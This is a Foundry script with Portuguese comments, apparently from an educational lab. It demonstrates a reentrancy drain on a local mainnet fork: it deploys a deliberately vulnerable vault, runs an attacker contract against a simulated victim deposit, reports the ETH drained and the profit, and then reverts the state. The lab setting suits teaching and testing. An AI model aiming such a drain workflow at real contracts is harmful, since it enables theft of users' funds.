// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {VaultVulneravel} from "../src/F1_Drenagem/VaultVulneravel.sol";
import {DrainReentrancia} from "../src/F1_Drenagem/DrainReentrancia.sol";

/// @title F1Drain — "fazer um script drenar dinheiro num fork"
/// @notice Versão `forge script` do drain. Roda contra um fork local,
///         imprime o relatório e — se você mandar — NADA acontece na
///         mainnet. Este arquivo é a prova executável da Fase 1.
///
/// COMO RODAR
/// ─────────
///   set -a && source .env && set +a
///   forge script script/F1Drain.s.sol:F1Drain \
///     --rpc-url $ETHEREUM_RPC_URL --fork-block-number 19000000 -vvv
///
/// Por que `--fork-block-number` e não `vm.createSelectFork` aqui?
/// Porque em `forge script` quem cria o fork é o CLI, não o código. É a
/// mesma máquina, Vista pelo outro lado. Em `forge test` quem cria é
/// o `vm.createSelectFork` dentro do setUp().
///
/// DIFERENÇA CRÍTICA ENTRE TESTE E SCRIPT (decore isto)
/// ─────────────────────────────────────────────────────
///   forge test  → o estado é DESCARTADO no fim. Cada teste começa limpo.
///   forge script→ se você rodar SEM --broadcast, o estado também é
///                 descartado: foi só uma simulação.
///                 Se você rodar COM --broadcast, a transação vai para a
///                 rede de verdade. NUMA MAINNET REAL ISSO É IRREVERSÍVEL.
///
///   Nunca coloque --broadcast num exploit sem ler o contrato três vezes.
contract F1Drain is Script {
    address constant ALVO_MAINNET = 0x28C6c06298d514Db089934071355E5743bf21d60;
    address constant VITIMA = address(0xBEEF);

    function run() external {
        uint256 snapshotId = vm.snapshotState();

        // ── 0. Estado inicial vindo da mainnet ────────────────────────
        uint256 saldoAlvoReal = ALVO_MAINNET.balance;
        console.log("=========================================================");
        console.log("  FASE 1 - DRAIN EM FORK DE MAINNET");
        console.log("=========================================================");
        console.log("  bloco do fork    :", block.number);
        console.log("  chainid          :", block.chainid);
        console.log("  alvo mainnet     :", ALVO_MAINNET);
        console.log("  saldo do alvo    :", saldoAlvoReal, "wei");
        console.log("");

        // ── 1. Monta o cenário ────────────────────────────────────────
        VaultVulneravel vault = new VaultVulneravel();
        DrainReentrancia atacante = new DrainReentrancia(vault);

        uint256 depositoVitima = 100 ether;
        vm.deal(VITIMA, depositoVitima);
        vm.startPrank(VITIMA);
        vault.deposit{value: depositoVitima}();
        vm.stopPrank();

        console.log("  deposito da vitima:", depositoVitima);
        console.log("  ETH no vault       :", address(vault).balance);
        console.log("");

        // ── 2. Executa o ataque ───────────────────────────────────────
        uint256 antes = address(vault).balance;

        uint256 capitalDeGiro = 50 ether;
        vm.deal(address(atacante), capitalDeGiro);
        uint256 saldoAtacanteAntes = address(atacante).balance;

        atacante.atacar(capitalDeGiro);

        uint256 depois = address(vault).balance;
        uint256 drenado = antes - depois;
        // O que ele depositou volta pra ele junto com o saque. O lucro
        // real é o drenado menos o capital que ele mesmo pôs.
        uint256 recebido = address(atacante).balance - saldoAtacanteAntes;
        uint256 lucro = recebido - capitalDeGiro;

        // ── 3. Relatório ─────────────────────────────────────────────
        console.log("---------------------------------------------------------");
        console.log("  RESULTADO");
        console.log("---------------------------------------------------------");
        console.log("  voltas (reentrancia):", atacante.voltas());
        console.log("  ETH no vault antes  :", antes);
        console.log("  ETH no vault depois :", depois);
        console.log("  ETH DRENADO         :", drenado);
        console.log("  capital de giro     :", capitalDeGiro);
        console.log("  recebido pelo atac. :", recebido);
        console.log("  LUCRO LIQUIDO       :", lucro);
        console.log("");
        console.log("  drain bem-sucedido? ", drenado > 0 ? "SIM" : "NAO");
        console.log("=========================================================");

        // ── 4. Prova: desfaz TUDO ─────────────────────────────────────
        // Reverte o estado do fork. A mainnet real nunca foi tocada, e
        // mesmo o fork volta ao ponto de partida. `forge script` faz isso
        // sozinho sem --broadcast, mas ser explícito ensina o hábito.
        vm.revertToState(snapshotId);
        console.log("");
        console.log("  estado revertido. mainnet intacta.");
    }
}
